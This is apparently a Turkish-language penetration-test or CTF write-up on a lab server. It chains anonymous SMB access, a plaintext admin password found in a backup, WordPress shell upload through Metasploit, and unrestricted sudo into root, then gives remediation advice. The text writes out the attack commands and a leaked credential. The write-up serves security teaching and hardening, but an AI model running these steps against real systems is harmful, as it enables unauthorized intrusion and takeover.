02 — VULN-01

Anonim SMB erişimi ve hassas bilgi ifşası

Samba (Port 445) servisi üzerinde "Anonymous" girişi aktif bırakılmıştı. Anonim erişimle bağlanan saldırgan (Eve), /Anonymous paylaşımında sistemin yedeğini (backup.zip) buldu.

smbclient anonim erişim
$ smbclient //192.168.1.118/Anonymous -N
Try "help" to get a list of possible commands.
smb: \> get backup.zip

Yedek içerisinde bulunan remember_me.txt dosyasında yönetici parolası açık metin olarak duruyordu:

remember_me.txt
$ cat ./remember_me.txt
Username:admin
Password:MachineBoy141
Etki Bu tek dosya, saldırganın sistemin dosya yapısını ve konfigürasyonlarını ele geçirmesinin yanı sıra, aynı parolanın hem WordPress hem de sistem kullanıcısı için ortak kullanıldığının da kapısını aralamıştır.

03 — VULN-02

Açık metin parola ile WordPress RCE

SMB üzerinden sızdırılan MachineBoy141 parolası WordPress admin paneline karşı doğrulandı ve geçerli çıktı. Yönetici yetkisiyle bir eklenti (plugin) yükleme mekanizması üzerinden sunucuda kod çalıştırıldı.

msfconsole
msf > use exploit/unix/webapp/wp_admin_shell_upload
msf > set rhosts 192.168.1.118
msf > set username admin
msf > set password MachineBoy141
msf > exploit
[*] Uploading payload...
[*] Meterpreter session opened

meterpreter > getuid
Server username: www-data
✓ www-data yetkisiyle uzaktan kod çalıştırma (RCE) sağlandı

04 — VULN-03

Hatalı sudoers yapılandırması ve yetki yükseltme

Aynı parolanın (MachineBoy141) sistem kullanıcısı kbadmin için de geçerli olduğu görüldü — SSH ile bu kullanıcıya geçiş yapıldı. Yetki kontrolünde, kullanıcıya /etc/sudoers üzerinde sınırsız yetki tanındığı ortaya çıktı.

sudo -l & privesc
kbadmin@kb-server:~$ sudo -l
User kbadmin may run the following commands on kb-server:
    (ALL : ALL) ALL
kbadmin@kb-server:$ sudo su
root@kb-server:~# cat flag.txt
[redacted]

Kullanıcının herhangi bir kısıtlama olmaksızın (ALL : ALL) ALL yetkisine sahip olması, tek bir sudo su komutuyla doğrudan root olunmasına izin verdi.

✓ root yetkisiyle tam sistem kontrolü sağlandı

Çözüm ve İyileştirme

Öneriler

  • Sıkılaştırma: SMB anonim erişimi derhal kapatılmalı, konuk kullanıcıların dosya listelemesi engellenmelidir.
  • Erişim Kontrolü: Sudoers dosyası "en az yetki" (least privilege) prensibine göre yeniden yapılandırılmalı, (ALL:ALL) gibi genel yetkiler kaldırılmalıdır.
  • Parola Güvenliği: Kritik parolalar asla açık metin dosyalarında saklanmamalı; farklı servisler için benzersiz parolalar kullanılmalıdır.
